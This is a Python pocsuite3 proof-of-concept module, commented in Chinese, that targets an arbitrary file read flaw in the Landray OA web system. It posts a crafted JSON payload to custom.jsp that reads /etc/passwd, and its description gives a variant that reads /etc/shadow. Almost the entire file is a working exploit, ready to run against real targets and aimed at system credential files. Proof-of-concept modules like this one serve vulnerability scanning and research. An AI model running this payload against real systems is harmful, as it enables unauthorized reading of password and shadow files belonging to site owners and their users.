from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class LandrayOAPoc(POCBase):
    vulID = "99238"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "ZorIqz"  # PoC作者的大名
    vulDate = "2021-05-06"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-07-16"  # 编写 PoC 的日期
    updateDate = "2022-07-16"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://mp.weixin.qq.com/s/8gAGN_BsSW4K3JsvrIXzuQ"]  # 漏洞地址来源,0day不用写
    name = "蓝凌OA系统 前台任意文件读取漏洞 PoC"  # PoC 名称
    appPowerLink = "https://www.landray.com.cn/?sorce=baidupinzhuanwy"  # 漏洞厂商主页地址
    appName = "蓝凌OA系统"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.ARBITRARY_FILE_READ  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    # samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
            蓝凌OA系统前台存在任意文件读取漏洞，会导致敏感文件的泄露。
        """  # 漏洞简要描述
    pocDesc = """
            POST /sys/ui/extend/varkind/custom.jsp
            payload: var={"body":{"file":"file:///etc/shadow"}}
        """  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"}
        data = 'var={"body":{"file":"file:///etc/passwd"}}'
        result = []
        # 一个异常处理 , 生怕站点关闭了 , 请求不到 , 代码报错不能运行
        try:
            url = f"{self.url.strip()}/sys/ui/extend/varkind/custom.jsp"  # self.url 就是你指定的-u 参数的值
            res = requests.post(url=url, headers=headers, data=data, verify=False, timeout=9)
            data_dict = res.json()
            # 判断是否存在漏洞
            if res.status_code == 200 and "root" in res.text:
                result.append(url)
        except Exception as e:
            print(e)
        # 跟 try ... except是一对的 , 最终一定会执行里面的代码 , 不管你是否报错
        finally:
            return result

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        # 攻击模式 , 就是在调用验证模式
        return self._verify()

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

# 其他自定义的可添加的功能函数
def other_fuc():
    pass

# 其他工具函数
def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(LandrayOAPoc)
